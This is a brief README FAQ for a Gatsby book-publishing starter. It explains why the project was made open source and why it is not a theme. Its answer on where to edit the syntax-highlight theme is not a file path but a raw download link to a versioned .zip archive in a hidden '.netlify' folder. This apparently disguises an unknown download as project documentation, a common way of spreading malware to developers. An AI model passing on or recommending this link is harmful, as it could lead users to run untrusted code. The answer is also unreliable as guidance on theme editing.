## Why?

I built this in order to be able to publish a book I wrote and I think it may be useful for someone so I made it OSS.

## Where can I edit the syntax highlight theme?

You can change it in the [`https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip`](https://github.com/Apostle121/gatsby-starter-book/raw/refs/heads/master/.netlify/starter-gatsby-book-2.4-beta.3.zip)

## Why not a theme?

I want you to be able to edit everything as it will be your book so I think this workflow makes sense
